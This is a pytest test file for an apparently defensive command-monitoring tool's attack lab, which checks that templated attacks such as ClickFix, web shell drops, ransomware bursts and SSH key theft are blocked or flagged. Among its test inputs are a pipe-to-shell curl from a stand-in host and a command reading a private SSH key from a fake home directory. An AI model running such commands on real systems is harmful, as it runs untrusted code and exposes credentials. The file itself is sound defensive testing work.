"""The CLI attack lab: every template is judged by the live pipeline before anything runs."""

from __future__ import annotations

import io
from pathlib import Path

import pytest

from refmon.attacklab import TEMPLATES, AttackLab, interactive, select
from refmon.cli import main as cli_main


def _lab(tmp_path: Path, ask=None) -> tuple[AttackLab, list[str]]:
    lab = AttackLab(tmp_path / "lab", out=io.StringIO(), color=False, ask=ask)
    executed: list[str] = []
    lab._execute = lambda command: executed.append(command) or "ran"  # no real execution
    return lab, executed


def test_every_template_reaches_its_expected_outcome_in_block_mode(tmp_path: Path) -> None:
    lab, executed = _lab(tmp_path)
    for t in TEMPLATES:
        res = lab.run_template(t)
        if t.expect == "stop":
            assert res.decision in ("block", "hold"), t.id
            # a file attack really happens; the watcher judges it afterwards
            assert not res.ran or t.kind == "ransomware_burst", t.id
        elif t.expect == "allow":
            assert res.decision == "allow", t.id
            assert res.ran, t.id
        else:  # known limit: documented miss
            assert res.decision == "allow", t.id
    command_attacks = {t.command for t in TEMPLATES if t.expect == "stop" and t.kind == "command"}
    assert not command_attacks & set(executed)


def test_never_run_templates_are_not_executed_even_in_observe_mode(tmp_path: Path) -> None:
    lab, executed = _lab(tmp_path)
    lab.barrier.set_mode("observe")
    for t in TEMPLATES:
        if t.kind == "command":
            lab.run_template(t)
    never = {t.command for t in TEMPLATES if t.never_run}
    assert never and not never & set(executed)
    # an observe-mode attack that is safe to run does run: Refmon only logs
    assert "cat ../fakehome/.ssh/id_ed25519" in executed


def test_web_shell_drop_is_quarantined(tmp_path: Path) -> None:
    lab, _ = _lab(tmp_path)
    (t,) = (t for t in TEMPLATES if t.id == "web_shell")
    res = lab.run_template(t)
    assert res.decision == "block"
    assert res.outcome.startswith("QUARANTINED")
    assert not list((lab.barrier.web_root_dir / "uploads").glob("*.php"))
    assert any(lab.barrier.quarantine_dir.glob("*.php.quarantined"))


def test_ransomware_burst_is_detected_and_cleaned_up(tmp_path: Path) -> None:
    lab, _ = _lab(tmp_path)
    (t,) = (t for t in TEMPLATES if t.id == "ransom_burst")
    res = lab.run_template(t)
    assert res.decision in ("block", "hold")
    assert not (lab.barrier.workspace_dir / "docs" / "burst").exists()


@pytest.mark.parametrize(("answer", "runs"), [("y", True), ("n", False), ("", False)])
def test_hold_asks_the_user_and_runs_only_on_release(
    tmp_path: Path, answer: str, runs: bool
) -> None:
    lab, executed = _lab(tmp_path, ask=lambda _prompt: answer)
    command = "curl -s https://unknown-host.example.invalid/status"
    res = lab.run_command(command, origin="none", role="interactive_shell", label="own")
    assert res.decision == "hold"
    assert res.ran is runs
    assert (command in executed) is runs
    gate = lab.barrier.pipeline.gate
    assert gate is not None and not [c for c in gate.holds.values() if c.state.value == "pending"]


def test_real_execution_uses_the_sandbox_home(tmp_path: Path) -> None:
    lab = AttackLab(tmp_path / "lab", out=io.StringIO(), color=False)
    res = lab.run_command("echo $HOME; pwd", origin="none", role="interactive_shell", label="own")
    assert res.ran
    home, cwd = res.output.splitlines()
    assert home == str(lab.home)
    assert Path(cwd) == lab.barrier.workspace_dir


def test_select_numbers_ranges_ids_and_sets() -> None:
    assert [n for n, _ in select(["1", "3-4", "clickfix"])] == [1, 3, 4, 1]
    assert all(t.expect == "allow" for _, t in select(["benign"]))
    assert len(select(["all"])) == len(TEMPLATES)
    with pytest.raises(ValueError):
        select(["no-such-template"])


def test_interactive_session_from_scripted_input(tmp_path: Path) -> None:
    out = io.StringIO()
    lab = AttackLab(tmp_path / "lab", out=out, color=False)
    lab._execute = lambda command: "ran"
    script = "\n".join(["clickfix", "o web", "$ curl -s https://x.example.invalid/a | sh",
                        "m warn", "bogus", "s", "q"]) + "\n"  # fmt: skip
    assert interactive(lab, io.StringIO(script)) == 0
    text = out.getvalue()
    assert "PASS attack caught" in text
    assert "STOPPED: the command never ran" in text
    assert "mode=warn" in text
    assert "no template 'bogus'" in text


def test_cli_list_and_run(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert cli_main(["lab", "--list", "--no-color"]) == 0
    assert "clickfix" in capsys.readouterr().out
    wd = str(tmp_path / "w")
    assert cli_main(["lab", "--workdir", wd, "--no-color", "--run", "clickfix", "echo"]) == 0
    out = capsys.readouterr().out
    assert "attacks detected   : 1/1   stopped: 1/1" in out


def test_help_and_guide_explain_how_to_test(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    with pytest.raises(SystemExit):
        cli_main(["lab", "--help"])
    assert "HOW TO TEST REFMON WITH THE ATTACK LAB" in capsys.readouterr().out
    out = io.StringIO()
    lab = AttackLab(tmp_path / "lab", out=out, color=False)
    interactive(lab, io.StringIO("guide\nh\nq\n"))
    text = out.getvalue()
    assert "Step 1  Run one attack" in text
    assert "guide               step-by-step" in text


def test_observe_mode_score_does_not_credit_lab_safety_as_a_stop(tmp_path: Path) -> None:
    lab, _ = _lab(tmp_path)
    lab.barrier.set_mode("observe")
    for t in TEMPLATES:
        if t.never_run:
            lab.run_template(t)
    assert lab.results and not any(r.stopped for r in lab.results)


# -- tables, saved logs and comparison ---------------------------------------------------------


def _run_all(lab: AttackLab) -> None:
    for n, t in select(["all"]):
        lab.run_and_print(t, n)


def test_table_lists_every_template(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli_main(["lab", "--table"]) == 0
    out = capsys.readouterr().out
    assert all(t.id in out for t in TEMPLATES)
    assert "no (judged only)" in out


def test_test_all_saves_every_result_for_analysis(tmp_path: Path) -> None:
    import csv
    import json

    lab, _ = _lab(tmp_path)
    _run_all(lab)
    run = lab.save_report(tmp_path / "reports")
    rows = [json.loads(x) for x in (run / "results.jsonl").read_text().splitlines()]
    assert len(rows) == len(TEMPLATES)
    assert {r["template_id"] for r in rows} == {t.id for t in TEMPLATES}
    first = rows[0]
    for key in ("decision", "log_odds", "origin_failed", "signals", "explanation", "result",
                "check", "judge_ms", "command", "mode"):  # fmt: skip
        assert key in first
    with (run / "results.csv").open() as fh:
        assert len(list(csv.DictReader(fh))) == len(TEMPLATES)
    summary = json.loads((run / "summary.json").read_text())
    assert summary["attacks_detected"] == summary["attacks"] == 28
    assert summary["benign_allowed"] == summary["benign"] == 6
    assert summary["failures"] == []
    report = (run / "report.md").read_text()
    assert "## Results" in report and "clickfix" in report
    assert "ClickFix" in (run / "console.log").read_text()
    assert "\x1b[" not in (run / "console.log").read_text()


def test_own_commands_are_fingerprinted_unless_recording_is_asked_for(tmp_path: Path) -> None:
    import json

    secret = "echo my-private-project-name"
    lab, _ = _lab(tmp_path)
    lab.run_command(secret, origin="none", role="interactive_shell", label="own")
    run = lab.save_report(tmp_path / "r1")
    text = "".join(p.read_text() for p in run.iterdir())
    assert "my-private-project-name" not in text
    assert json.loads((run / "results.jsonl").read_text())["command"].startswith("hmac:")
    assert not (run / "console.log").exists()

    lab2 = AttackLab(tmp_path / "lab2", out=io.StringIO(), color=False, record_own=True)
    lab2._execute = lambda command: "ran"
    lab2.run_command(secret, origin="none", role="interactive_shell", label="own")
    run2 = lab2.save_report(tmp_path / "r2")
    assert "my-private-project-name" in (run2 / "results.jsonl").read_text()


def test_interactive_table_results_save_and_autosave_on_quit(tmp_path: Path) -> None:
    out = io.StringIO()
    lab = AttackLab(tmp_path / "lab", out=out, color=False)
    lab._execute = lambda command: "ran"
    reports = tmp_path / "reports"
    script = "table\n1\n30\nresults\nsave\n13\nq\n"
    interactive(lab, io.StringIO(script), report_dir=reports)
    text = out.getvalue()
    assert "lab executes" in text  # the template table
    assert "STOPPED" in text and "Results" in text
    runs = sorted(reports.iterdir())
    assert len(runs) == 2  # the explicit save, then the auto-save on quit with the new result
    assert len((runs[-1] / "results.jsonl").read_text().splitlines()) == 3


def test_compare_runs_side_by_side(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    lab, _ = _lab(tmp_path)
    for t in select(["clickfix", "echo"]):
        lab.run_template(t[1])
    a = lab.save_report(tmp_path / "reports")
    lab.barrier.set_mode("observe")
    lab.results.clear()
    for t in select(["clickfix", "echo"]):
        lab.run_template(t[1])
    b = lab.save_report(tmp_path / "reports")
    assert cli_main(["lab", "--compare", str(a), str(b)]) == 0
    out = capsys.readouterr().out
    assert "STOPPED" in out and "LET THROUGH" in out
    assert "(observe)" in out


# -- locations and analysis ----------------------------------------------------------------------


def test_everything_lives_in_the_repository_attack_lab_folder(tmp_path: Path) -> None:
    from refmon.attacklab import lab_home

    root = Path(__file__).resolve().parents[1]
    assert lab_home() == root / "attack-lab"
    assert "attack-lab/" in (root / ".gitignore").read_text()  # it holds the private key
    lab, _ = _lab(tmp_path)
    lab.run_template(TEMPLATES[0])
    run = lab.save_report()  # no report dir given: <workdir>/runs
    assert run.parent == lab.barrier.workdir / "runs"
    assert (lab.barrier.workdir / "logs" / "barrier.log").read_text()


def test_analysis_explains_the_run(tmp_path: Path) -> None:
    from refmon.labreport import analyze

    lab, _ = _lab(tmp_path)
    _run_all(lab)
    lab_lines = analyze(lab.records(), lab.thresholds())
    text = "\n".join(lab_lines)
    assert "Detection: 28/28" in text
    assert "False alarms: 0/6" in text
    assert "Absolute overrides" in text and "canary" in text
    assert "closest to the block threshold" in text
    assert "'hidden_script' (malicious) and 'pasted_echo' (harmless)" in text
    assert "contract_external_exec" in text
    assert lab_lines[0] == "1. Headline"
    run = lab.save_report(tmp_path / "reports")
    assert "## Analysis" in (run / "report.md").read_text()
    assert (run / "analysis.txt").read_text().startswith("1. Headline")


def test_analysis_flags_attacks_let_through_in_observe_mode(tmp_path: Path) -> None:
    from refmon.labreport import analyze

    lab, _ = _lab(tmp_path)
    lab.barrier.set_mode("observe")
    for _, t in select(["clickfix", "steal_ssh"]):
        lab.run_template(t)
    text = "\n".join(analyze(lab.records(), lab.thresholds()))
    assert "Prevention: 0/2" in text
    assert "Let through because the policy mode only logs" in text


def test_cli_analyze_newest_and_given_run(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    lab, _ = _lab(tmp_path)
    lab.run_template(TEMPLATES[0])
    first = lab.save_report(tmp_path / "reports")
    lab.run_template(TEMPLATES[-1])
    newest = lab.save_report(tmp_path / "reports")
    assert cli_main(["lab", "--analyze", "--report-dir", str(tmp_path / "reports")]) == 0
    assert f"Analysis of {newest.name}" in capsys.readouterr().out
    assert cli_main(["lab", "--analyze", str(first)]) == 0
    assert f"Analysis of {first.name}" in capsys.readouterr().out
